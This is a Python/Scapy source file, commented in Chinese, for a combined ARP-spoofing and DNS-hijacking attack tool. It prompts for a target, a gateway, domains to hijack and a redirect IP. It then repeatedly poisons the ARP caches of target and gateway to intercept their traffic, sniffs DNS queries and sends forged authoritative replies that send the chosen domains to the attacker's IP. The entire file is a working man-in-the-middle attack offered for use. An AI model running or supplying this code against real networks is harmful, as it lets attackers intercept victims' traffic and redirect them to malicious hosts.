#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ARP欺骗 + DNS劫持综合攻击工具
自动化的中间人攻击和DNS劫持一体化工具
"""

import threading
import time
import socket
import subprocess
import re
from scapy.all import *

class ARPDNSComboAttack:
    def __init__(self):
        self.attack_running = False
        self.local_ip = socket.gethostbyname(socket.gethostname())
        
        # 统一配置参数
        self.config = {
            'target_ip': '',
            'gateway_ip': '',
            'attack_duration': 300,
            'arp_threads': 10,
            'dns_threads': 5,
            'dns_domains': 'baidu.com,qq.com,taobao.com',
            'redirect_ip': '8.8.8.8',
            'attack_intensity': 'medium'
        }
        
        # 统计信息
        self.stats = {
            'arp_packets_sent': 0,
            'dns_packets_sent': 0,
            'domains_hijacked': 0,
            'start_time': None
        }
    
    def get_unified_configuration(self):
        """获取统一的攻击配置"""
        print("=" * 70)
        print("          ARP欺骗 + DNS劫持综合攻击工具")
        print("=" * 70)
        
        # 网络配置
        print("\n🌐 网络配置:")
        print("-" * 40)
        
        # 目标IP配置
        while True:
            target_ip = input("请输入目标IP地址: ").strip()
            if self.validate_ip(target_ip):
                self.config['target_ip'] = target_ip
                break
            else:
                print("❌ IP地址格式不正确，请重新输入")
        
        # 网关IP配置
        while True:
            gateway_ip = input("请输入网关IP地址: ").strip()
            if self.validate_ip(gateway_ip):
                self.config['gateway_ip'] = gateway_ip
                break
            else:
                print("❌ IP地址格式不正确，请重新输入")
        
        # 攻击参数配置
        print("\n⚡ 攻击参数配置:")
        print("-" * 40)
        
        # 攻击时长
        while True:
            try:
                duration = int(input("请输入攻击时长(秒) (默认300): ").strip() or "300")
                if duration > 0:
                    self.config['attack_duration'] = duration
                    break
                else:
                    print("❌ 时长必须大于0")
            except ValueError:
                print("❌ 请输入有效的数字")
        
        # ARP线程数
        while True:
            try:
                arp_threads = int(input("请输入ARP欺骗线程数 (默认10): ").strip() or "10")
                if 1 <= arp_threads <= 50:
                    self.config['arp_threads'] = arp_threads
                    break
                else:
                    print("❌ 线程数必须在1-50之间")
            except ValueError:
                print("❌ 请输入有效的数字")
        
        # DNS线程数
        while True:
            try:
                dns_threads = int(input("请输入DNS劫持线程数 (默认5): ").strip() or "5")
                if 1 <= dns_threads <= 20:
                    self.config['dns_threads'] = dns_threads
                    break
                else:
                    print("❌ 线程数必须在1-20之间")
            except ValueError:
                print("❌ 请输入有效的数字")
        
        # 攻击强度
        while True:
            intensity = input("请输入攻击强度 (low/medium/high) (默认medium): ").strip().lower()
            if intensity in ['low', 'medium', 'high']:
                self.config['attack_intensity'] = intensity
                break
            elif not intensity:
                self.config['attack_intensity'] = 'medium'
                break
            else:
                print("❌ 请输入 low, medium 或 high")
        
        # DNS劫持配置
        print("\n🔗 DNS劫持配置:")
        print("-" * 40)
        
        # 域名列表
        while True:
            domains = input("请输入要劫持的域名列表 (用逗号分隔): ").strip()
            if domains:
                self.config['dns_domains'] = domains
                break
            else:
                print("❌ 域名列表不能为空")
        
        # 重定向IP
        while True:
            redirect_ip = input("请输入重定向IP地址 (默认8.8.8.8): ").strip()
            if redirect_ip:
                if self.validate_ip(redirect_ip):
                    self.config['redirect_ip'] = redirect_ip
                    break
                else:
                    print("❌ IP地址格式不正确")
            else:
                self.config['redirect_ip'] = '8.8.8.8'
                break
        
        return self.show_configuration_summary()
    
    def validate_ip(self, ip):
        """验证IP地址格式"""
        pattern = r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
        return re.match(pattern, ip) is not None
    
    def show_configuration_summary(self):
        """显示配置摘要并请求确认"""
        print("\n" + "=" * 70)
        print("          攻击配置确认")
        print("=" * 70)
        
        print("🌐 网络配置:")
        print(f"   目标IP: {self.config['target_ip']}")
        print(f"   网关IP: {self.config['gateway_ip']}")
        print(f"   本机IP: {self.local_ip}")
        
        print("\n⚡ 攻击参数:")
        print(f"   攻击时长: {self.config['attack_duration']}秒")
        print(f"   ARP线程数: {self.config['arp_threads']}")
        print(f"   DNS线程数: {self.config['dns_threads']}")
        print(f"   攻击强度: {self.config['attack_intensity']}")
        
        print("\n🔗 DNS劫持:")
        print(f"   劫持域名: {self.config['dns_domains']}")
        print(f"   重定向到: {self.config['redirect_ip']}")
        
        print("\n" + "=" * 70)
        
        # 请求用户确认
        while True:
            confirm = input("\n确认执行综合攻击? (Y/N): ").strip().upper()
            if confirm == 'Y':
                return True
            elif confirm == 'N':
                print("❌ 攻击已取消")
                return False
            else:
                print("❌ 请输入 Y 或 N")
    
    def start_combo_attack(self):
        """开始综合攻击"""
        print("=" * 70)
        print("          ARP欺骗 + DNS劫持综合攻击开始")
        print("=" * 70)
        
        self.attack_running = True
        self.stats['start_time'] = time.time()
        self.stats['arp_packets_sent'] = 0
        self.stats['dns_packets_sent'] = 0
        self.stats['domains_hijacked'] = 0
        
        # 显示攻击信息
        self.display_attack_info()
        
        try:
            # 1. 网络环境检查
            if not self.check_network_environment():
                print("[-] 网络环境检查失败，攻击终止")
                return
            
            # 2. 启动ARP欺骗攻击（后台线程）
            print("\n[+] 启动ARP欺骗攻击...")
            arp_thread = threading.Thread(target=self.arp_spoof_attack)
            arp_thread.daemon = True
            arp_thread.start()
            
            # 等待ARP欺骗生效
            print("[+] 等待ARP欺骗生效 (3秒)...")
            time.sleep(3)
            
            # 3. 启动DNS劫持攻击
            print("[+] 启动DNS劫持攻击...")
            self.dns_hijack_attack()
            
            # 等待攻击完成
            arp_thread.join(timeout=self.config['attack_duration'])
            
        except KeyboardInterrupt:
            print("\n[!] 用户中断攻击")
        except Exception as e:
            print(f"[-] 攻击错误: {e}")
        finally:
            self.stop_attack()
    
    def display_attack_info(self):
        """显示攻击信息"""
        print("\n📊 攻击信息:")
        print(f"   目标设备: {self.config['target_ip']}")
        print(f"   攻击时长: {self.config['attack_duration']}秒")
        print(f"   劫持域名: {self.config['dns_domains']}")
        print(f"   重定向到: {self.config['redirect_ip']}")
        print("\n" + "-" * 70)
    
    def check_network_environment(self):
        """检查网络环境 - 改进版本"""
        print("\n[+] 检查网络环境...")
        
        # 检查网络段
        local_segment = '.'.join(self.local_ip.split('.')[:3])
        target_segment = '.'.join(self.config['target_ip'].split('.')[:3])
        
        if local_segment == target_segment:
            print("   ✅ 同一网络段")
        else:
            print(f"   ⚠️  不同网络段: {local_segment} vs {target_segment}")
        
        # 检查目标可达性（非强制）
        target_reachable = False
        try:
            result = subprocess.run(['ping', '-n', '2', self.config['target_ip']], 
                                  capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                print("   ✅ 目标设备可达")
                target_reachable = True
            else:
                print("   ⚠️  目标设备不可达（ARP欺骗可能仍然有效）")
        except:
            print("   ⚠️  目标检查失败（继续尝试ARP欺骗）")
        
        # 检查网关可达性
        gateway_reachable = False
        try:
            result = subprocess.run(['ping', '-n', '2', self.config['gateway_ip']], 
                                  capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                print("   ✅ 网关设备可达")
                gateway_reachable = True
            else:
                print("   ❌ 网关设备不可达（ARP欺骗可能失败）")
                # 网关不可达时询问是否继续
                while True:
                    confirm = input("   是否继续尝试? (Y/N): ").strip().upper()
                    if confirm == 'Y':
                        print("   ⚠️  继续尝试ARP欺骗...")
                        break
                    elif confirm == 'N':
                        return False
                    else:
                        print("   ❌ 请输入 Y 或 N")
        except:
            print("   ❌ 网关检查失败")
            return False
        
        # 检查MAC地址获取
        print("\n[+] 检查MAC地址获取...")
        target_mac = self.get_mac_address(self.config['target_ip'])
        gateway_mac = self.get_mac_address(self.config['gateway_ip'])
        
        if target_mac != "ff:ff:ff:ff:ff:ff":
            print(f"   ✅ 目标MAC: {target_mac}")
        else:
            print("   ⚠️  无法获取目标MAC（将使用广播地址）")
        
        if gateway_mac != "ff:ff:ff:ff:ff:ff":
            print(f"   ✅ 网关MAC: {gateway_mac}")
        else:
            print("   ❌ 无法获取网关MAC（ARP欺骗可能失败）")
            # 网关MAC获取失败时询问是否继续
            while True:
                confirm = input("   是否继续尝试? (Y/N): ").strip().upper()
                if confirm == 'Y':
                    print("   ⚠️  继续尝试ARP欺骗...")
                    break
                elif confirm == 'N':
                    return False
                else:
                    print("   ❌ 请输入 Y 或 N")
        
        return True
    
    def get_mac_address(self, ip):
        """获取MAC地址"""
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
            return answered_list[0][1].hwsrc
        except:
            return "ff:ff:ff:ff:ff:ff"  # 默认广播地址
    
    def arp_spoof_attack(self):
        """ARP欺骗攻击"""
        print("\n[ARP] 开始ARP欺骗攻击...")
        
        # 获取MAC地址
        target_mac = self.get_mac_address(self.config['target_ip'])
        gateway_mac = self.get_mac_address(self.config['gateway_ip'])
        
        print(f"[ARP] 目标MAC: {target_mac}")
        print(f"[ARP] 网关MAC: {gateway_mac}")
        
        def send_arp_spoof():
            """发送ARP欺骗包"""
            try:
                # 欺骗目标：我是网关
                packet1 = ARP(op=2, pdst=self.config['target_ip'], 
                             psrc=self.config['gateway_ip'], hwdst=target_mac)
                # 欺骗网关：我是目标
                packet2 = ARP(op=2, pdst=self.config['gateway_ip'], 
                             psrc=self.config['target_ip'], hwdst=gateway_mac)
                
                send(packet1, verbose=0)
                send(packet2, verbose=0)
                
                self.stats['arp_packets_sent'] += 2
                
            except Exception as e:
                print(f"[ARP] 错误: {e}")
        
        # 多线程ARP欺骗
        end_time = time.time() + self.config['attack_duration']
        
        while self.attack_running and time.time() < end_time:
            threads = []
            
            for _ in range(self.config['arp_threads']):
                if not self.attack_running:
                    break
                
                t = threading.Thread(target=send_arp_spoof)
                threads.append(t)
                t.start()
            
            # 等待线程完成
            for t in threads:
                t.join()
            
            # 根据强度控制发送频率
            if self.config['attack_intensity'] == 'low':
                time.sleep(5)
            elif self.config['attack_intensity'] == 'medium':
                time.sleep(2)
            else:  # high
                time.sleep(0.5)
            
            # 显示进度
            elapsed = time.time() - self.stats['start_time']
            if int(elapsed) % 10 == 0:  # 每10秒显示一次
                print(f"[ARP] 已发送 {self.stats['arp_packets_sent']} 个ARP包")
    
    def create_dns_response(self, query_packet, spoofed_ip):
        """创建DNS欺骗响应包"""
        try:
            if query_packet.haslayer(DNS):
                dns_query = query_packet[DNS]
                
                dns_response = IP(dst=query_packet[IP].src, src=query_packet[IP].dst) / \
                              UDP(dport=query_packet[UDP].sport, sport=53) / \
                              DNS(id=dns_query.id,
                                  qr=1,  # 响应
                                  aa=1,  # 权威答案
                                  qd=dns_query.qd,
                                  an=DNSRR(rrname=dns_query.qd.qname,
                                          type='A',
                                          ttl=600,
                                          rdata=spoofed_ip))
                
                return dns_response
        except Exception as e:
            print(f"[DNS] 创建响应包失败: {e}")
        
        return None
    
    def dns_hijack_attack(self):
        """DNS劫持攻击"""
        print("\n[DNS] 开始DNS劫持攻击...")
        
        # 解析域名列表
        domains_list = [domain.strip() for domain in self.config['dns_domains'].split(',')]
        
        print(f"[DNS] 劫持域名: {', '.join(domains_list)}")
        print(f"[DNS] 重定向到: {self.config['redirect_ip']}")
        
        def dns_sniffer(packet):
            """DNS数据包嗅探器"""
            if packet.haslayer(DNS) and packet.haslayer(DNSQR):
                query = packet[DNSQR].qname.decode()
                
                # 检查是否为目标域名
                for domain in domains_list:
                    if domain in query:
                        print(f"[DNS] 检测到查询: {query}")
                        
                        # 创建欺骗响应
                        spoofed_response = self.create_dns_response(packet, self.config['redirect_ip'])
                        
                        if spoofed_response:
                            send(spoofed_response, verbose=0)
                            self.stats['dns_packets_sent'] += 1
                            self.stats['domains_hijacked'] += 1
                            print(f"[DNS] 劫持成功: {query} -> {self.config['redirect_ip']}")
        
        # 主动DNS攻击线程
        def active_dns_attack():
            """主动DNS攻击"""
            end_time = time.time() + self.config['attack_duration']
            
            while self.attack_running and time.time() < end_time:
                try:
                    # 对每个域名发送DNS欺骗包
                    for domain in domains_list:
                        dns_query = IP(dst=self.config['target_ip']) / \
                                   UDP(sport=12345, dport=53) / \
                                   DNS(rd=1, qd=DNSQR(qname=domain))
                        
                        spoofed_response = self.create_dns_response(dns_query, self.config['redirect_ip'])
                        
                        if spoofed_response:
                            send(spoofed_response, verbose=0)
                            self.stats['dns_packets_sent'] += 1
                            
                    time.sleep(3)  # 控制发送频率
                    
                except Exception as e:
                    print(f"[DNS] 主动攻击错误: {e}")
        
        # 启动主动DNS攻击线程
        active_thread = threading.Thread(target=active_dns_attack)
        active_thread.daemon = True
        active_thread.start()
        
        # 开始被动嗅探
        try:
            print("[DNS] 开始监听DNS流量...")
            sniff(filter="udp port 53", prn=dns_sniffer, timeout=self.config['attack_duration'])
        except Exception as e:
            print(f"[DNS] 嗅探失败: {e}")
    
    def stop_attack(self):
        """停止攻击"""
        if self.attack_running:
            print("\n[+] 停止综合攻击...")
            self.attack_running = False
            
            # 显示统计信息
            elapsed = time.time() - self.stats['start_time']
            print("\n" + "=" * 70)
            print("          攻击统计")
            print("=" * 70)
            print(f"   总运行时间: {int(elapsed)}秒")
            print(f"   ARP包发送数: {self.stats['arp_packets_sent']}")
            print(f"   DNS包发送数: {self.stats['dns_packets_sent']}")
            print(f"   域名劫持数: {self.stats['domains_hijacked']}")
            print("=" * 70)

def main():
    """主函数"""
    try:
        attack = ARPDNSComboAttack()
        
        # 获取配置并确认
        if attack.get_unified_configuration():
            attack.start_combo_attack()
        
    except KeyboardInterrupt:
        print("\n[!] 程序被用户中断")
    except Exception as e:
        print(f"[-] 程序错误: {e}")

if __name__ == "__main__":
    main()